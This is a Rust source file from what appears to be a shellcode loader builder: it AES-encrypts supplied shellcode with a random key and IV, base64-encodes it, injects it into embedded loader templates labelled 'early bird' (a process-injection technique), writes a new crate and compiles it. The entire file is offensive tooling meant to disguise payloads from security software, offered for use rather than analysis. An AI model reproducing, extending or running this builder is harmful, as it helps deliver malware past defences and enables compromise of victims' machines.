use rust_embed::RustEmbed;
use std::fs::{write,create_dir_all};
use rand::Rng;
use whoami;
use libaes::Cipher;
use rsmaker::{RANDOM_AES_KEY,AES_PASSWORD_LEN,base64_encode,complie};

#[derive(RustEmbed)]
#[folder = "temp"]
struct Asset;

pub fn make_rs(aes_shellcode:String,password1:String,password2:String)->(){
    
    let head = Asset::get("bird2/head.rs").unwrap();
    let head_str = std::str::from_utf8(head.data.as_ref()).unwrap();

    let model = Asset::get("bird2/model.rs").unwrap();
    let model_str = std::str::from_utf8(model.data.as_ref()).unwrap();

    let toml = Asset::get("bird2/Cargo.toml").unwrap();
    let toml_str = std::str::from_utf8(toml.data.as_ref()).unwrap();

    let config = Asset::get("bird2/config.toml").unwrap();
    let   config_str = std::str::from_utf8(config.data.as_ref()).unwrap();

    let shellcode = format!(r#"let SHELLCODE: &str = "{}";"#,aes_shellcode);
    let password1 = format!(r#"let PASSWORD1: &[u8; 16] = b"{}";"#,password1);
    let password2 = format!(r#"let PASSWORD2: &[u8; 16] = b"{}";"#,password2);

    let mut new_string = String::from("");

    new_string.push_str(head_str);
    new_string.push_str("\n");
    new_string.push_str(&shellcode);
    new_string.push_str("\n");
    new_string.push_str(&password1);
    new_string.push_str("\n");
    new_string.push_str(&password2);
    new_string.push_str("\n");
    new_string.push_str(model_str);

    let _ = create_dir_all("loader/src");
    let _ = create_dir_all("loader/.cargo");
    let _ = write(format!("loader/src/main.rs"), new_string);
    let _ = write(format!("loader/Cargo.toml"), toml_str);
    let config_str = &config_str.replace("XXXXXXXX", &whoami::username());
    let _ = write(format!("loader/.cargo/config.toml"), config_str);


}


pub fn run(shellcode:Vec<u8>)->std::io::Result<()>{
    println!("mode: early bird 2222 AES");
    let (shellcode,password1,password2) = aes_base64(shellcode);
    make_rs(shellcode,password1,password2);
    complie();
    println!("compling....please wait...");
    Ok(())
}

pub fn aes_base64(shellcode:Vec<u8>)->(String,String,String){
    let mut rng = rand::thread_rng();
    let password1: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();

    println!("aes key is {}",&password1);
    let password2: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();
        println!("iv key is {}",&password2);
        let cipher = Cipher::new_128(password1.as_bytes()[0..16].try_into().unwrap());
        let shellcode = cipher.cbc_encrypt(password2.as_bytes(), &shellcode);

        let shellcode = base64_encode(shellcode);

        (shellcode,password1,password2)

}